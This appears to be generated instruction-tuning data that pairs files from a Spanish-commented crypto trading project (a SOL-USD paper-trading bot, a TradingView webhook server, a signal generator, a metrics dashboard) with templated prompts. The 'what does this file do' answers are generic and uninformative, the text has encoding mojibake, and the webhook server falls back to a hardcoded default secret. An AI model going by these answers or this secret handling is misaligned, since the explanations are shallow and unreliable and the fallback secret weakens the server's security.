{"instruction": "Show me the code for paper_trading.py which is part of the fundex project.", "input": "", "output": "Here's the code for `projects\\active\\fundex\\paper_trading.py`:\n\n```py\n#!/usr/bin/env python3\n\"\"\"\nPaper Trading Bot - Fundex Challenge\nSimula trading con la estrategia EMA Momentum optimizada\n\"\"\"\nimport pandas as pd\nimport numpy as np\nimport yfinance as yf\nfrom datetime import datetime, timedelta\nimport json\nimport time\nimport os\nimport warnings\nwarnings.filterwarnings('ignore')\n\n# ============ CONFIGURACIÃ“N ============\nCONFIG = {\n    'symbol': 'SOL-USD',\n    'initial_balance': 5000,      # Challenge 5k\n    'risk_per_trade': 0.01,       # 1% por trade\n    'max_daily_loss': 0.04,       # 4% max DD diario\n    'profit_target': 0.10,        # 10% objetivo\n    'fast_ema': 9,\n    'slow_ema': 20,\n    'rsi_period': 14,\n    'rsi_upper': 70,\n    'rsi_lower': 30,\n}\n\nSCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))\nSTATE_FILE = os.path.join(SCRIPT_DIR, 'paper_state.json')\nTRADES_FILE = os.path.join(SCRIPT_DIR, 'paper_trades.csv')\n\n# ============ INDICADORES ============\ndef ema(close, period):\n    return pd.Series(close).ewm(span=period, adjust=False).mean()\n\ndef rsi(close, period=14):\n    delta = pd.Series(close).diff()\n    gain = (delta.where(delta > 0, 0)).rolling(window=period).mean()\n    loss = (-delta.where(delta < 0, 0)).rolling(window=period).mean()\n    rs = gain / loss\n    return 100 - (100 / (1 + rs))\n\n# ============ ESTADO ============\ndef load_state():\n    if os.path.exists(STATE_FILE):\n        with open(STATE_FILE, 'r') as f:\n            return json.load(f)\n    return {\n        'balance': CONFIG['initial_balance'],\n        'position': None,\n        'entry_price': 0,\n        'position_size': 0,\n        'trades': [],\n        'daily_pnl': 0,\n        'start_date': str(datetime.now().date()),\n        'status': 'ACTIVE'\n    }\n\ndef save_state(state):\n    with open(STATE_FILE, 'w') as f:\n        json.dump(state, f, indent=2)\n\n# ============ DATA ============\ndef get_data(symbol, period=\"5d\", interval=\"1h\"):\n    df = yf.download(symbol, period=period, interval=interval, progress=False)\n    if hasattr(df.columns, 'levels'):\n        df.columns = df.columns.get_level_values(0)\n    return df\n\n# ============ SEÃ‘ALES ============\ndef get_signal(df):\n    df['ema_fast'] = ema(df['Close'], CONFIG['fast_ema'])\n    df['ema_slow'] = ema(df['Close'], CONFIG['slow_ema'])\n    df['rsi'] = rsi(df['Close'], CONFIG['rsi_period'])\n\n    last = df.iloc[-1]\n    prev = df.iloc[-2]\n\n    signal = 'HOLD'\n\n    # BUY: EMA cross up + RSI no sobrecomprado\n    if prev['ema_fast'] <= prev['ema_slow'] and last['ema_fast'] > last['ema_slow']:\n        if last['rsi'] < CONFIG['rsi_upper']:\n            signal = 'BUY'\n\n    # SELL: EMA cross down o RSI > 80\n    elif prev['ema_fast'] >= prev['ema_slow'] and last['ema_fast'] < last['ema_slow']:\n        signal = 'SELL'\n    elif last['rsi'] > 80:\n        signal = 'SELL'\n\n    return signal, last['Close'], last['rsi']\n\n# ============ TRADING ============\ndef execute_trade(state, signal, price):\n    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')\n\n    if signal == 'BUY' and state['position'] is None:\n        # Calcular tamaÃ±o de posiciÃ³n (1% riesgo)\n        risk_amount = state['balance'] * CONFIG['risk_per_trade']\n        position_size = risk_amount / (price * 0.02)  # Asumiendo 2% stop loss\n        position_size = min(position_size, state['balance'] * 0.95 / price)\n\n        cost = position_size * price\n        if cost <= state['balance']:\n            state['balance'] -= cost\n            state['position'] = 'LONG'\n            state['entry_price'] = price\n            state['position_size'] = position_size\n\n            trade = {\n                'timestamp': timestamp,\n                'type': 'BUY',\n                'price': price,\n                'size': position_size,\n                'value': cost,\n                'balance': state['balance']\n            }\n            state['trades'].append(trade)\n            log_trade(trade)\n\n            print(f\"  ðŸŸ¢ BUY  {position_size:.4f} @ ${price:.2f} = ${cost:.2f}\")\n            return True\n\n    elif signal == 'SELL' and state['position'] == 'LONG':\n        value = state['position_size'] * price\n        pnl = value - (state['position_size'] * state['entry_price'])\n        pnl_pct = (price / state['entry_price'] - 1) * 100\n\n        state['balance'] += value\n        state['daily_pnl'] += pnl\n\n        trade = {\n            'timestamp': timestamp,\n            'type': 'SELL',\n            'price': price,\n            'size': state['position_size'],\n            'value': value,\n            'pnl': pnl,\n            'pnl_pct': pnl_pct,\n            'balance': state['balance']\n        }\n        state['trades'].append(trade)\n        log_trade(trade)\n\n        emoji = 'ðŸ’°' if pnl > 0 else 'ðŸ“‰'\n        print(f\"  {emoji} SELL {state['position_size']:.4f} @ ${price:.2f} = ${value:.2f} (PnL: ${pnl:.2f} / {pnl_pct:.2f}%)\")\n\n        state['position'] = None\n        state['entry_price'] = 0\n        state['position_size'] = 0\n        return True\n\n    return False\n\ndef log_trade(trade):\n    df = pd.DataFrame([trade])\n    df.to_csv(TRADES_FILE, mode='a', header=not os.path.exists(TRADES_FILE), index=False)\n\n# ============ CHECKS ============\ndef check_limits(state):\n    total_pnl = state['balance'] - CONFIG['initial_balance']\n    total_pnl_pct = total_pnl / CONFIG['initial_balance'] * 100\n    daily_pnl_pct = state['daily_pnl'] / CONFIG['initial_balance'] * 100\n\n    # Check profit target\n    if total_pnl_pct >= CONFIG['profit_target'] * 100:\n        state['status'] = 'TARGET_REACHED'\n        print(f\"\\nðŸŽ¯ Â¡OBJETIVO ALCANZADO! +{total_pnl_pct:.2f}%\")\n        return False\n\n    # Check max daily loss\n    if daily_pnl_pct <= -CONFIG['max_daily_loss'] * 100:\n        state['status'] = 'DAILY_LIMIT'\n        print(f\"\\nðŸ›‘ LÃMITE DIARIO ALCANZADO: {daily_pnl_pct:.2f}%\")\n        return False\n\n    # Check max drawdown\n    if total_pnl_pct <= -10:\n        state['status'] = 'MAX_DD'\n        print(f\"\\nðŸ’€ MAX DRAWDOWN: {total_pnl_pct:.2f}%\")\n        return False\n\n    return True\n\n# ============ MAIN ============\ndef run_paper_trading(continuous=False):\n    print(\"=\"*60)\n    print(\"PAPER TRADING - FUNDEX CHALLENGE\")\n    print(\"=\"*60)\n    print(f\"Symbol:     {CONFIG['symbol']}\")\n    print(f\"Balance:    ${CONFIG['initial_balance']}\")\n    print(f\"Target:     +{CONFIG['profit_target']*100}%\")\n    print(f\"Max DD:     -{CONFIG['max_daily_loss']*100}%\")\n    print(\"=\"*60)\n\n    state = load_state()\n\n    while True:\n        try:\n            # Reset daily PnL si es nuevo dÃ­a\n            today = str(datetime.now().date())\n            if state.get('start_date') != today:\n                state['daily_pnl'] = 0\n                state['start_date'] = today\n\n            # Obtener datos y seÃ±al\n            df = get_data(CONFIG['symbol'])\n            signal, price, rsi_val = get_signal(df)\n\n            # Stats\n            total_pnl = state['balance'] - CONFIG['initial_balance']\n            if state['position']:\n                unrealized = (price - state['entry_price']) * state['position_size']\n                total_pnl += unrealized\n\n            total_pnl_pct = total_pnl / CONFIG['initial_balance'] * 100\n\n            print(f\"\\n[{datetime.now().strftime('%H:%M:%S')}] {CONFIG['symbol']}\")\n            print(f\"  Price: ${price:.2f} | RSI: {rsi_val:.1f} | Signal: {signal}\")\n            print(f\"  Balance: ${state['balance']:.2f} | PnL: ${total_pnl:.2f} ({total_pnl_pct:+.2f}%)\")\n\n            if state['position']:\n                print(f\"  Position: {state['position']} {state['position_size']:.4f} @ ${state['entry_price']:.2f}\")\n\n            # Ejecutar trade si hay seÃ±al\n            if signal != 'HOLD':\n                execute_trade(state, signal, price)\n\n            # Verificar lÃ­mites\n            if not check_limits(state):\n                break\n\n            # Guardar estado\n            save_state(state)\n\n            if not continuous:\n                break\n\n            print(\"\\n  â³ Esperando 5 min...\")\n            time.sleep(300)\n\n        except KeyboardInterrupt:\n            print(\"\\n\\nâ¹ï¸ Paper trading detenido\")\n            break\n        except Exception as e:\n            print(f\"\\nâŒ Error: {e}\")\n            if not continuous:\n                break\n            time.sleep(60)\n\n    # Resumen final\n    print(\"\\n\" + \"=\"*60)\n    print(\"RESUMEN PAPER TRADING\")\n    print(\"=\"*60)\n    total_pnl = state['balance'] - CONFIG['initial_balance']\n    print(f\"Balance Final:  ${state['balance']:.2f}\")\n    print(f\"PnL Total:      ${total_pnl:.2f} ({total_pnl/CONFIG['initial_balance']*100:+.2f}%)\")\n    print(f\"Trades:         {len(state['trades'])}\")\n    print(f\"Status:         {state['status']}\")\n\n    save_state(state)\n    return state\n\nif __name__ == \"__main__\":\n    import sys\n    continuous = '--live' in sys.argv\n    run_paper_trading(continuous=continuous)\n\n```"}
{"instruction": "What does the file paper_trading.py do?", "input": "```py\n#!/usr/bin/env python3\n\"\"\"\nPaper Trading Bot - Fundex Challenge\nSimula trading con la estrategia EMA Momentum optimizada\n\"\"\"\nimport pandas as pd\nimport numpy as np\nimport yfinance as yf\nfrom datetime import datetime, timedelta\nimport json\nimport time\nimport os\nimport warnings\nwarnings.filterwarnings('ignore')\n\n# ============ CONFIGURACIÃ“N ============\nCONFIG = {\n    'symbol': 'SOL-USD',\n    'initial_balance': 5000,      # Challenge 5k\n    'risk_per_trade': 0.01,       # 1% por trade\n    'max_daily_loss': 0.04,       # 4% max DD diario\n    'profit_target': 0.10,        # 10% objetivo\n    'fast_ema': 9,\n    'slow_ema': 20,\n    'rsi_period': 14,\n    'rsi_upper': 70,\n    'rsi_lower': 30,\n}\n\nSCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))\nSTATE_FILE = os.path.join(SCRIPT_DIR, 'paper_state.json')\nTRADES_FILE = os.path.join(SCRIPT_DIR, 'paper_trades.csv')\n\n# ============ INDICADORES ============\ndef ema(close, period):\n    return pd.Series(close).ewm(span=period, adjust=False).mean()\n\ndef rsi(close, period=14):\n    delta = pd.Series(close).diff()\n    gain = (delta.where(delta > 0, 0)).rolling(window=period).mean()\n    loss = (-delta.where(delta < 0, 0)).rolling(window=period).mean()\n    rs = gain / loss\n    return 100 - (100 / (1 + rs))\n\n# ============ ESTADO ============\ndef load_state():\n    if os.path.exists(STATE_FILE):\n        with open(STATE_FILE, 'r') as f:\n            return json.load(f)\n    return {\n        'balance': CONFIG['initial_balance'],\n        'position': None,\n        'entry_price': 0,\n        'position_size': 0,\n        'trades': [],\n        'daily_pnl': 0,\n        'start_date': str(datetime.now().date()),\n        'status': 'ACTIVE'\n    }\n\ndef save_state(state):\n    with open(STATE_FILE, 'w') as f:\n        json.dump(state, f, indent=2)\n\n# ============ DATA ============\ndef get_data(symbol, period=\"5d\", interval=\"1h\"):\n    df = yf.download(symbol, period=period, interval=interval, progress=False)\n    if hasattr(df.columns, 'levels'):\n        df.c\n```", "output": "This file `paper_trading.py` is part of the fundex project. Based on the code structure, it appears to handle trading operations and strategy execution."}
{"instruction": "Show me the code for webhook_server.py which is part of the fundex project.", "input": "", "output": "Here's the code for `projects\\active\\fundex\\webhook_server.py`:\n\n```py\n#!/usr/bin/env python3\n\"\"\"\nWebhook Server para TradingView\nRecibe alertas y ejecuta operaciones\nDeploy: Google Cloud Run\n\"\"\"\nfrom flask import Flask, request, jsonify\nimport json\nimport os\nfrom datetime import datetime\n\napp = Flask(__name__)\n\n# Estado del bot\nSTATE = {\n    'balance': 5000,\n    'position': None,\n    'entry_price': 0,\n    'trades': [],\n    'status': 'ACTIVE'\n}\n\n# ConfiguraciÃ³n\nCONFIG = {\n    'initial_balance': 5000,\n    'risk_per_trade': 0.01,\n    'max_daily_loss': 0.04,\n    'profit_target': 0.10,\n    'secret': os.getenv('WEBHOOK_SECRET', 'fundex2024')\n}\n\ndef log_event(msg):\n    print(f\"[{datetime.now().strftime('%H:%M:%S')}] {msg}\")\n\n@app.route('/health', methods=['GET'])\ndef health():\n    return jsonify({'status': 'ok', 'balance': STATE['balance']})\n\n@app.route('/webhook', methods=['POST'])\ndef webhook():\n    \"\"\"\n    Recibe alertas de TradingView\n    Formato esperado:\n    {\n        \"secret\": \"fundex2024\",\n        \"action\": \"BUY\" o \"SELL\",\n        \"symbol\": \"SOLUSD\",\n        \"price\": 136.50\n    }\n    \"\"\"\n    try:\n        data = request.json\n        log_event(f\"Webhook recibido: {data}\")\n\n        # Verificar secret\n        if data.get('secret') != CONFIG['secret']:\n            return jsonify({'error': 'Invalid secret'}), 401\n\n        action = data.get('action', '').upper()\n        price = float(data.get('price', 0))\n        symbol = data.get('symbol', '')\n\n        if action == 'BUY' and STATE['position'] is None:\n            # Calcular tamaÃ±o\n            risk = STATE['balance'] * CONFIG['risk_per_trade']\n            size = risk / (price * 0.02)\n\n            STATE['position'] = 'LONG'\n            STATE['entry_price'] = price\n            STATE['position_size'] = size\n\n            trade = {\n                'time': str(datetime.now()),\n                'action': 'BUY',\n                'symbol': symbol,\n                'price': price,\n                'size': size\n            }\n            STATE['trades'].append(trade)\n            log_event(f\"ðŸŸ¢ BUY {size:.4f} {symbol} @ ${price}\")\n\n            return jsonify({\n                'status': 'executed',\n                'action': 'BUY',\n                'size': size,\n                'price': price\n            })\n\n        elif action == 'SELL' and STATE['position'] == 'LONG':\n            pnl = (price - STATE['entry_price']) * STATE['position_size']\n            STATE['balance'] += STATE['position_size'] * price\n\n            trade = {\n                'time': str(datetime.now()),\n                'action': 'SELL',\n                'symbol': symbol,\n                'price': price,\n                'pnl': pnl\n            }\n            STATE['trades'].append(trade)\n\n            STATE['position'] = None\n            STATE['entry_price'] = 0\n\n            emoji = 'ðŸ’°' if pnl > 0 else 'ðŸ“‰'\n            log_event(f\"{emoji} SELL @ ${price} | PnL: ${pnl:.2f}\")\n\n            # Check si pasÃ³ el challenge\n            total_pnl = STATE['balance'] - CONFIG['initial_balance']\n            if total_pnl >= CONFIG['initial_balance'] * CONFIG['profit_target']:\n                STATE['status'] = 'CHALLENGE_PASSED'\n                log_event(\"ðŸŽ¯ Â¡CHALLENGE PASADO!\")\n\n            return jsonify({\n                'status': 'executed',\n                'action': 'SELL',\n                'pnl': pnl,\n                'balance': STATE['balance']\n            })\n\n        return jsonify({'status': 'no_action', 'reason': 'Conditions not met'})\n\n    except Exception as e:\n        log_event(f\"âŒ Error: {e}\")\n        return jsonify({'error': str(e)}), 500\n\n@app.route('/status', methods=['GET'])\ndef status():\n    total_pnl = STATE['balance'] - CONFIG['initial_balance']\n    return jsonify({\n        'balance': STATE['balance'],\n        'pnl': total_pnl,\n        'pnl_pct': total_pnl / CONFIG['initial_balance'] * 100,\n        'position': STATE['position'],\n        'trades': len(STATE['trades']),\n        'status': STATE['status']\n    })\n\n@app.route('/reset', methods=['POST'])\ndef reset():\n    data = request.json or {}\n    if data.get('secret') != CONFIG['secret']:\n        return jsonify({'error': 'Invalid secret'}), 401\n\n    STATE['balance'] = CONFIG['initial_balance']\n    STATE['position'] = None\n    STATE['trades'] = []\n    STATE['status'] = 'ACTIVE'\n    return jsonify({'status': 'reset', 'balance': STATE['balance']})\n\nif __name__ == '__main__':\n    port = int(os.getenv('PORT', 8080))\n    log_event(f\"ðŸš€ Webhook server en puerto {port}\")\n    app.run(host='0.0.0.0', port=port)\n\n```"}
{"instruction": "What does the file webhook_server.py do?", "input": "```py\n#!/usr/bin/env python3\n\"\"\"\nWebhook Server para TradingView\nRecibe alertas y ejecuta operaciones\nDeploy: Google Cloud Run\n\"\"\"\nfrom flask import Flask, request, jsonify\nimport json\nimport os\nfrom datetime import datetime\n\napp = Flask(__name__)\n\n# Estado del bot\nSTATE = {\n    'balance': 5000,\n    'position': None,\n    'entry_price': 0,\n    'trades': [],\n    'status': 'ACTIVE'\n}\n\n# ConfiguraciÃ³n\nCONFIG = {\n    'initial_balance': 5000,\n    'risk_per_trade': 0.01,\n    'max_daily_loss': 0.04,\n    'profit_target': 0.10,\n    'secret': os.getenv('WEBHOOK_SECRET', 'fundex2024')\n}\n\ndef log_event(msg):\n    print(f\"[{datetime.now().strftime('%H:%M:%S')}] {msg}\")\n\n@app.route('/health', methods=['GET'])\ndef health():\n    return jsonify({'status': 'ok', 'balance': STATE['balance']})\n\n@app.route('/webhook', methods=['POST'])\ndef webhook():\n    \"\"\"\n    Recibe alertas de TradingView\n    Formato esperado:\n    {\n        \"secret\": \"fundex2024\",\n        \"action\": \"BUY\" o \"SELL\",\n        \"symbol\": \"SOLUSD\",\n        \"price\": 136.50\n    }\n    \"\"\"\n    try:\n        data = request.json\n        log_event(f\"Webhook recibido: {data}\")\n\n        # Verificar secret\n        if data.get('secret') != CONFIG['secret']:\n            return jsonify({'error': 'Invalid secret'}), 401\n\n        action = data.get('action', '').upper()\n        price = float(data.get('price', 0))\n        symbol = data.get('symbol', '')\n\n        if action == 'BUY' and STATE['position'] is None:\n            # Calcular tamaÃ±o\n            risk = STATE['balance'] * CONFIG['risk_per_trade']\n            size = risk / (price * 0.02)\n\n            STATE['position'] = 'LONG'\n            STATE['entry_price'] = price\n            STATE['position_size'] = size\n\n            trade = {\n                'time': str(datetime.now()),\n                'action': 'BUY',\n                'symbol': symbol,\n                'price': price,\n                'size': size\n            }\n            STATE['trades'].append(trade)\n            log_event(f\"ðŸŸ¢ BUY {size:.4f\n```", "output": "This file `webhook_server.py` is part of the fundex project. Based on the code structure, it appears to handle trading operations and strategy execution."}
{"instruction": "Show me the code for signal_generator.py which is part of the signals project.", "input": "", "output": "Here's the code for `projects\\active\\fundex\\signals\\signal_generator.py`:\n\n```py\n\"\"\"\nGenerador de seÃ±ales en tiempo real - EMA Momentum\n\"\"\"\nimport pandas as pd\nimport numpy as np\nimport yfinance as yf\nfrom datetime import datetime, timedelta\nimport json\nimport warnings\nwarnings.filterwarnings('ignore')\n\n# ParÃ¡metros optimizados (se actualizan tras optimizaciÃ³n)\nPARAMS = {\n    'fast': 9,\n    'slow': 21,\n    'rsi_period': 14,\n    'rsi_upper': 70,\n    'symbols': ['SOL-USD', 'ETH-USD', 'BNB-USD']\n}\n\ndef ema(close, period):\n    return pd.Series(close).ewm(span=period, adjust=False).mean()\n\ndef rsi(close, period=14):\n    delta = pd.Series(close).diff()\n    gain = (delta.where(delta > 0, 0)).rolling(window=period).mean()\n    loss = (-delta.where(delta < 0, 0)).rolling(window=period).mean()\n    rs = gain / loss\n    return 100 - (100 / (1 + rs))\n\ndef get_latest_data(symbol, period=\"5d\", interval=\"1h\"):\n    \"\"\"Obtiene datos recientes\"\"\"\n    df = yf.download(symbol, period=period, interval=interval, progress=False)\n    if hasattr(df.columns, 'levels'):\n        df.columns = df.columns.get_level_values(0)\n    return df\n\ndef calculate_signals(symbol):\n    \"\"\"Calcula seÃ±ales para un sÃ­mbolo\"\"\"\n    df = get_latest_data(symbol)\n    if df.empty or len(df) < PARAMS['slow'] + 5:\n        return None\n\n    df['ema_fast'] = ema(df['Close'], PARAMS['fast'])\n    df['ema_slow'] = ema(df['Close'], PARAMS['slow'])\n    df['rsi'] = rsi(df['Close'], PARAMS['rsi_period'])\n\n    # Ãšltima fila\n    last = df.iloc[-1]\n    prev = df.iloc[-2]\n\n    # Detectar seÃ±ales\n    signal = 'HOLD'\n    strength = 0\n\n    # Cruce alcista\n    if prev['ema_fast'] <= prev['ema_slow'] and last['ema_fast'] > last['ema_slow']:\n        if last['rsi'] < PARAMS['rsi_upper']:\n            signal = 'BUY'\n            strength = min(100, (PARAMS['rsi_upper'] - last['rsi']) * 2)\n\n    # Cruce bajista\n    elif prev['ema_fast'] >= prev['ema_slow'] and last['ema_fast'] < last['ema_slow']:\n        signal = 'SELL'\n        strength = min(100, last['rsi'])\n\n    # RSI extremo\n    if last['rsi'] > 80:\n        signal = 'SELL'\n        strength = 90\n\n    return {\n        'symbol': symbol,\n        'timestamp': str(datetime.now()),\n        'price': round(last['Close'], 2),\n        'ema_fast': round(last['ema_fast'], 2),\n        'ema_slow': round(last['ema_slow'], 2),\n        'rsi': round(last['rsi'], 2),\n        'signal': signal,\n        'strength': round(strength, 1),\n        'trend': 'UP' if last['ema_fast'] > last['ema_slow'] else 'DOWN'\n    }\n\ndef generate_all_signals():\n    \"\"\"Genera seÃ±ales para todos los sÃ­mbolos\"\"\"\n    print(\"=\"*60)\n    print(f\"SEÃ‘ALES - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\")\n    print(\"=\"*60)\n\n    signals = []\n    for symbol in PARAMS['symbols']:\n        sig = calculate_signals(symbol)\n        if sig:\n            signals.append(sig)\n            emoji = 'ðŸŸ¢' if sig['signal'] == 'BUY' else 'ðŸ”´' if sig['signal'] == 'SELL' else 'âšª'\n            print(f\"\\n{emoji} {sig['symbol']}\")\n            print(f\"   Price:  ${sig['price']}\")\n            print(f\"   Signal: {sig['signal']} (strength: {sig['strength']}%)\")\n            print(f\"   RSI:    {sig['rsi']}\")\n            print(f\"   Trend:  {sig['trend']}\")\n\n    # Guardar seÃ±ales\n    with open('/home/l0ve/fundex/signals/latest_signals.json', 'w') as f:\n        json.dump(signals, f, indent=2)\n\n    # TambiÃ©n CSV\n    pd.DataFrame(signals).to_csv('/home/l0ve/fundex/signals/signals_log.csv',\n                                  mode='a', header=False, index=False)\n\n    print(\"\\n\" + \"=\"*60)\n    active = [s for s in signals if s['signal'] != 'HOLD']\n    if active:\n        print(f\"âš¡ {len(active)} SEÃ‘ALES ACTIVAS\")\n        for s in active:\n            print(f\"   â†’ {s['signal']} {s['symbol']} @ ${s['price']}\")\n    else:\n        print(\"ðŸ˜´ Sin seÃ±ales activas\")\n\n    return signals\n\nif __name__ == \"__main__\":\n    generate_all_signals()\n\n```"}
{"instruction": "What does the file signal_generator.py do?", "input": "```py\n\"\"\"\nGenerador de seÃ±ales en tiempo real - EMA Momentum\n\"\"\"\nimport pandas as pd\nimport numpy as np\nimport yfinance as yf\nfrom datetime import datetime, timedelta\nimport json\nimport warnings\nwarnings.filterwarnings('ignore')\n\n# ParÃ¡metros optimizados (se actualizan tras optimizaciÃ³n)\nPARAMS = {\n    'fast': 9,\n    'slow': 21,\n    'rsi_period': 14,\n    'rsi_upper': 70,\n    'symbols': ['SOL-USD', 'ETH-USD', 'BNB-USD']\n}\n\ndef ema(close, period):\n    return pd.Series(close).ewm(span=period, adjust=False).mean()\n\ndef rsi(close, period=14):\n    delta = pd.Series(close).diff()\n    gain = (delta.where(delta > 0, 0)).rolling(window=period).mean()\n    loss = (-delta.where(delta < 0, 0)).rolling(window=period).mean()\n    rs = gain / loss\n    return 100 - (100 / (1 + rs))\n\ndef get_latest_data(symbol, period=\"5d\", interval=\"1h\"):\n    \"\"\"Obtiene datos recientes\"\"\"\n    df = yf.download(symbol, period=period, interval=interval, progress=False)\n    if hasattr(df.columns, 'levels'):\n        df.columns = df.columns.get_level_values(0)\n    return df\n\ndef calculate_signals(symbol):\n    \"\"\"Calcula seÃ±ales para un sÃ­mbolo\"\"\"\n    df = get_latest_data(symbol)\n    if df.empty or len(df) < PARAMS['slow'] + 5:\n        return None\n\n    df['ema_fast'] = ema(df['Close'], PARAMS['fast'])\n    df['ema_slow'] = ema(df['Close'], PARAMS['slow'])\n    df['rsi'] = rsi(df['Close'], PARAMS['rsi_period'])\n\n    # Ãšltima fila\n    last = df.iloc[-1]\n    prev = df.iloc[-2]\n\n    # Detectar seÃ±ales\n    signal = 'HOLD'\n    strength = 0\n\n    # Cruce alcista\n    if prev['ema_fast'] <= prev['ema_slow'] and last['ema_fast'] > last['ema_slow']:\n        if last['rsi'] < PARAMS['rsi_upper']:\n            signal = 'BUY'\n            strength = min(100, (PARAMS['rsi_upper'] - last['rsi']) * 2)\n\n    # Cruce bajista\n    elif prev['ema_fast'] >= prev['ema_slow'] and last['ema_fast'] < last['ema_slow']:\n        signal = 'SELL'\n        strength = min(100, last['rsi'])\n\n    # RSI extremo\n    if last['rsi'] > 80:\n        signal = 'SELL\n```", "output": "This file `signal_generator.py` is part of the signals project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for metrics_dashboard.py which is part of the strategies project.", "input": "", "output": "Here's the code for `projects\\active\\fundex\\strategies\\metrics_dashboard.py`:\n\n```py\n\"\"\"\nDashboard de mÃ©tricas - Correlaciones y anÃ¡lisis entre datos\n\"\"\"\nimport pandas as pd\nimport numpy as np\nimport yfinance as yf\nfrom datetime import datetime\nimport warnings\nwarnings.filterwarnings('ignore')\n\nSYMBOLS = ['SOL-USD', 'ETH-USD', 'BNB-USD', 'BTC-USD']\n\ndef get_data(symbol, period=\"1y\"):\n    df = yf.download(symbol, period=period, progress=False)\n    if hasattr(df.columns, 'levels'):\n        df.columns = df.columns.get_level_values(0)\n    return df['Close']\n\ndef calculate_metrics():\n    print(\"=\"*70)\n    print(\"DASHBOARD DE MÃ‰TRICAS - CORRELACIONES Y ANÃLISIS\")\n    print(\"=\"*70)\n\n    # Obtener datos\n    print(\"\\nDescargando datos...\")\n    prices = pd.DataFrame()\n    for symbol in SYMBOLS:\n        prices[symbol] = get_data(symbol)\n\n    returns = prices.pct_change().dropna()\n\n    # 1. CORRELACIONES\n    print(\"\\n\" + \"=\"*70)\n    print(\"ðŸ“Š MATRIZ DE CORRELACIÃ“N\")\n    print(\"=\"*70)\n    corr = returns.corr()\n    print(corr.round(3))\n\n    # 2. VOLATILIDAD\n    print(\"\\n\" + \"=\"*70)\n    print(\"ðŸ“ˆ VOLATILIDAD ANUALIZADA\")\n    print(\"=\"*70)\n    vol = returns.std() * np.sqrt(365) * 100\n    vol_df = pd.DataFrame({'Symbol': vol.index, 'Volatilidad %': vol.values.round(2)})\n    print(vol_df.to_string(index=False))\n\n    # 3. SHARPE RATIO (asumiendo rf=0)\n    print(\"\\n\" + \"=\"*70)\n    print(\"âš¡ SHARPE RATIO (Ãºltimos 365 dÃ­as)\")\n    print(\"=\"*70)\n    sharpe = (returns.mean() * 365) / (returns.std() * np.sqrt(365))\n    sharpe_df = pd.DataFrame({'Symbol': sharpe.index, 'Sharpe': sharpe.values.round(3)})\n    sharpe_df = sharpe_df.sort_values('Sharpe', ascending=False)\n    print(sharpe_df.to_string(index=False))\n\n    # 4. MAX DRAWDOWN\n    print(\"\\n\" + \"=\"*70)\n    print(\"ðŸ“‰ MAX DRAWDOWN\")\n    print(\"=\"*70)\n    dd_results = []\n    for symbol in SYMBOLS:\n        cummax = prices[symbol].cummax()\n        drawdown = (prices[symbol] - cummax) / cummax * 100\n        max_dd = drawdown.min()\n        dd_results.append({'Symbol': symbol, 'Max DD %': round(max_dd, 2)})\n    dd_df = pd.DataFrame(dd_results)\n    print(dd_df.to_string(index=False))\n\n    # 5. BETA vs BTC\n    print(\"\\n\" + \"=\"*70)\n    print(\"ðŸŽ¯ BETA vs BTC\")\n    print(\"=\"*70)\n    btc_ret = returns['BTC-USD']\n    beta_results = []\n    for symbol in SYMBOLS:\n        if symbol != 'BTC-USD':\n            cov = returns[symbol].cov(btc_ret)\n            var = btc_ret.var()\n            beta = cov / var\n            beta_results.append({'Symbol': symbol, 'Beta': round(beta, 3)})\n    beta_df = pd.DataFrame(beta_results)\n    print(beta_df.to_string(index=False))\n\n    # 6. RENDIMIENTO ACUMULADO\n    print(\"\\n\" + \"=\"*70)\n    print(\"ðŸ’° RENDIMIENTO ACUMULADO (YTD)\")\n    print(\"=\"*70)\n    ytd = ((prices.iloc[-1] / prices.iloc[0]) - 1) * 100\n    ytd_df = pd.DataFrame({'Symbol': ytd.index, 'YTD %': ytd.values.round(2)})\n    ytd_df = ytd_df.sort_values('YTD %', ascending=False)\n    print(ytd_df.to_string(index=False))\n\n    # 7. MOMENTUM SCORE\n    print(\"\\n\" + \"=\"*70)\n    print(\"ðŸš€ MOMENTUM SCORE\")\n    print(\"=\"*70)\n    momentum = []\n    for symbol in SYMBOLS:\n        p = prices[symbol]\n        # Score = (precio actual / SMA20 - 1) + (SMA20 / SMA50 - 1)\n        sma20 = p.rolling(20).mean().iloc[-1]\n        sma50 = p.rolling(50).mean().iloc[-1]\n        current = p.iloc[-1]\n        score = ((current / sma20 - 1) * 50) + ((sma20 / sma50 - 1) * 50)\n        momentum.append({\n            'Symbol': symbol,\n            'Price': round(current, 2),\n            'SMA20': round(sma20, 2),\n            'SMA50': round(sma50, 2),\n            'Score': round(score, 2)\n        })\n    mom_df = pd.DataFrame(momentum).sort_values('Score', ascending=False)\n    print(mom_df.to_string(index=False))\n\n    # RESUMEN FINAL\n    print(\"\\n\" + \"=\"*70)\n    print(\"ðŸ† RANKING FINAL (Sharpe + Momentum - DD)\")\n    print(\"=\"*70)\n\n    final_scores = []\n    for symbol in SYMBOLS:\n        s = sharpe_df[sharpe_df['Symbol'] == symbol]['Sharpe'].values[0]\n        m = mom_df[mom_df['Symbol'] == symbol]['Score'].values[0] / 100\n        d = abs(dd_df[dd_df['Symbol'] == symbol]['Max DD %'].values[0]) / 100\n        score = s + m - d\n        final_scores.append({'Symbol': symbol, 'Score': round(score, 3)})\n\n    final_df = pd.DataFrame(final_scores).sort_values('Score', ascending=False)\n    print(final_df.to_string(index=False))\n\n    # Guardar\n    metrics = {\n        'correlation': corr.to_dict(),\n        'volatility': vol.to_dict(),\n        'sharpe': sharpe.to_dict(),\n        'momentum': {m['Symbol']: m['Score'] for m in momentum},\n        'final_ranking': final_df.to_dict('records')\n    }\n\n    pd.DataFrame(final_scores).to_csv('/home/l0ve/fundex/backtests/metrics_summary.csv', index=False)\n    corr.to_csv('/home/l0ve/fundex/backtests/correlation_matrix.csv')\n\n    print(\"\\nâœ… MÃ©tricas guardadas en backtests/\")\n\n    return metrics\n\nif __name__ == \"__main__\":\n    calculate_metrics()\n\n```"}
